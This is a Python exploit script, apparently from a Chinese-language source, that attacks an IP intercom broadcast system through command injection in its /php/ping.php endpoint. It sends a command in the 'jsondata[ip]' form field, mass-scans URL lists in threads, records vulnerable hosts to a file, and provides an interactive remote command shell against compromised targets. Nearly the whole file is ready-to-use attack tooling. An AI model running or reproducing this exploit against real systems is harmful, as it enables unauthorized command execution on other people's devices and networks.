#coding:utf-8
import requests
import sys
import urllib3
import base64
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import re
#U2FsdGVkX1+WA4r7re57DsiQV3NwzLpRmQ0/1JRNgw43pSyqHB8DXkteR7gQlOch
#haoxiongdi666

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]


proxies={'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080'}
#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

headers = {

	'User-Agent': get_ua(),
	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'Accept-Language': 'zh-CN,zh;q=0.9',
#	'cmd': 'whoami'
	}
data ='''jsondata[type]=3&jsondata[ip]=whoami'''

#有漏洞的url写入文件	
def wirte_targets(vurl, filename):
	with open(filename, "a+") as f:
		f.write(vurl + "\n")

def check_url(url):
	url=parse.urlparse(url)
	url=url.scheme + '://' + url.netloc
	url1=url + '/php/ping.php'
	try:
		res1 = requests.post(url1,headers=headers,data=data, timeout=5)
		data1=res1.text.encode('utf-8').decode('unicode_escape')
	#	print(data1)
		rsp_command=re.findall(r'\["(.*?)"\]',data1,re.DOTALL)[0]
	#	print(rsp_command)
	#	data = json.loads(res1.text)
		#print(res1.text)
	#	print(data1)
		if res1.status_code == 200  and '["' in res1.text and 'whoami' not in res1.text:
	#	if res1.status_code == 200 and len(rsp_command)!=0:
		#	repcmd = rsp_command.replace('\n','')
		#	print("\033[32m[+]{0}  {1} {2}\033[0m".format(url,rsp_command,res1.status_code))
			print("\033[32m[+]{} is vulnerable. {}\033[0m".format(url,rsp_command))
			wirte_targets(url,"vuln.txt")
			return 1
		else:
			print("\033[31m[-]{} not vulnerable.\033[0m".format(url))
	except Exception as e:
		print("\033[34m[!]{} request false.\033[0m".format(url))
		pass

#
#cmdshell命令执行
def cmdshell(url):
	if check_url(url) == 1:
		url = parse.urlparse(url)
		url1 = url.scheme + '://' + url.netloc + '/php/ping.php'
		while 1:
			cmd = input("\033[35mshell: \033[0m")
			if cmd =="exit":
				sys.exit(0)
			else:
				headers = {'User-Agent': get_ua(),
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	#			'cmd':cmd
				}
				data ='''jsondata[type]=3&jsondata[ip]='''+cmd
				try:
					res = requests.post(url1,data=data,headers=headers,timeout=10,verify=False)
					data2=res.text.encode('utf-8').decode('unicode_escape')
					rsp_command1=re.findall(r'\["(.*?)"\]',data2,re.DOTALL)[0]
				#	rsp_command=re.findall(r'(.*?)response_error', res.text, re.DOTALL)[0]
					if len(rsp_command1) != 0:
						rsptext1 = rsp_command1
						print("\033[32m{}\033[0m".format(rsptext1))
					else:
						print("\033[31m[-]{} request flase!\033[0m".format(url1))

				except Exception as e:
					print("\033[31m[-]{} is timeout!\033[0m".format(url1))




def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_url, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''

	IP网络对讲广播系统命令执行       
	                                                                    
	                                                                    
                                      	By bboy
	'''
	print(show + '\n')
	arg=ArgumentParser(description='IP网络对讲广播系统命令执行 By nehw')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	arg.add_argument("-c",
					"--cmd",
					help="command; Example:python3 CVE-2023-34960.py -c http://ip:port")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	cmd=args.cmd
	print("[+]任务开始.....")
	start=time()
	if url != None and filename == None and cmd == None:
		check_url(url)
	elif url == None and filename != None and cmd == None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	elif url==None and cmd != filename == None:
		cmdshell(cmd)
	end=time()
	print('任务完成,用时%ds.' %(end-start))
